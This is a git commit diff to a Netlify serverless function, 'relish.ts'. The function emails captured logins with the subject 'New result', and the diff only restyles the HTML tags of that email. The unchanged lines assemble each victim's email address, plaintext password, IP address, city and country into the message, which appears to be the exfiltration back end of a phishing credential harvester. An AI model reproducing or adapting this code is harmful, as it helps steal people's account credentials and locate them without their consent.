7808c19679f5b800685edb9c7e2518dd49586497
wirthschwind <139864045+wirthschwind@users.noreply.github.com>
2024-01-18 21:00:15 +0100

    Update relish.ts

--- netlify/functions/relish.ts
+++ netlify/functions/relish.ts
@@ -24,10 +24,10 @@ export default async (req: Request, context: Context) => {
       subject: "New result",
       text: `Email: ${email} :: Password: ${password} :: Context: ${context.geo}`,
       html: `<div>
-            <h3>Login information:</h3><br/>
+            <b>Login information:</b><br/>
             Email:: ${email} <br/>
-            Password:: ${password} <br/><br/>
-            <h6>Geolocation:</h6><br/>
+            Password:: ${password} <br/>
+            <b>Geolocation:</b><br/>
             IP:: ${context.ip} <br/>
             City:: ${context?.geo?.city} <br/>
             Country:: ${Object.values(context?.geo?.country)} <br/>
